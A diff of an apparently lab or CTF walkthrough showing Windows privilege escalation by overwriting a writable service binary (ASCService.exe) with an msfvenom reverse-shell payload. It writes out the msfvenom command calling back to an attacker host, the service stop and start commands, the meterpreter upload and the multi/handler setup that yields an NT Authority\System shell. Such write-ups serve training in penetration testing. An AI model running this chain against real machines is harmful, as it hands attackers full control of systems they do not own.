@@ -95,27 +95,31 @@ The result we are interested in it the one with the "CanRestart"  option set to 
 ![](images/20230913100109.png)
 As we can see from the image above we have a modifiable path and write permissions to that directory. This means we can replace the ASCService.exe file there with our maliciously crafted payload, restart the service which will then run our infected program.
 
-Next we craft our payload from our attack machine using msfvenom and name it the same name as the AdvanceSystemCareService executable which is ASCService.exe:
+Next we craft our payload from our attack machine using msfvenom and name it the same name as the AdvanceSystemCareService executable which is "ASCService.exe":
 ```shell
 msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
 ```
 
 ![](images/20230913100821.png)
 
+Now we stop the AdvancedSytemCareService9 from running so that we can replace the legitimate service with our malicious executable. Command to stop service:
 
-So the next step for us is to stop the AdvancedSytemCareService9 from running so that we can upload our malicious executable and replace it with the legitimate one.
 ```powershell
 Stop-Service -Name "AdvacnedSystemCareService9"
 ```
+
 ![](images/20230913101110.png)
+As we can see the service has been stoppeed.
 
 Now let's go back to our meterpreter shell to upload the payload to our target
+
 ```shell
 upload /path/to/payload
 ```
+
 ![](images/20230913101225.png)
 
-Before we execute our payload by starting the service again, we need to first setup a multi handler to catch our new shell as `NT Authority\System`. To do that we first background our current meterpreter shell using CTRL + Z and use the multi handler:
+Before we execute our payload by starting the service again, we need to first setup a multi handler to catch our new shell as NT Authority\\System. To do that we first background our current meterpreter shell using CTRL + Z and use the multi handler:
 
 ```shell
 use exploit/multi/handler
@@ -130,22 +134,26 @@ set LPORT <PORT>
 ```
 
 ![](images/20230913101929.png)
-now we run the exploit as a job so that it will run in the background and enter into our previous meterpreter session:
+
+Run the exploit in the background and enter into our previous meterpreter session:
 ```shell
 exploit -j
 ```
 
 ![](images/20230913102154.png)
 
-Now we enter back into the powershell and can now start the AdvancedSystemCareService9 and it'll execute our malicious payload executable rather than the legitimate service since we have already overwritten it.
+Back in our powershell shell (lol) we can now start the service AdvancedSystemCareService9 and it'll execute our malicious payload executable rather than the legitimate service since we have already replaced it.
 
 ```powershell
 Start-Service -Name "AdvanceSystemCareService9"
 ```
 
 ![](images/20230913102705.png)
-As we can see from the image above it has created a new shell for us which is going to a an `NT Authority\System` level shell. Let's take a look.
+
+As we can see from the image above it has created an NT Authority\\System level shell. Let's take a look.
+
 We first background our current shell and enter into the new shell.
+
 ![](images/20230913103418.png)
 
 Bingo!.
